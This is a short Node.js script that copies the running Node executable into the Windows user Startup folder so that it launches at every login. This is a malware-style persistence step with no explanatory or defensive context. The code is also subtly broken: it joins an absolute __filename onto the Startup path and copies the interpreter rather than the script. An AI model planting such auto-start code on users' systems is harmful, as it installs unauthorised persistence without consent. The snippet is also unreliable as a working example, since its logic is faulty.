const { copyFileSync } = require('fs');
const { join } = require('path');

copyFileSync(process.execPath, join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', __filename));
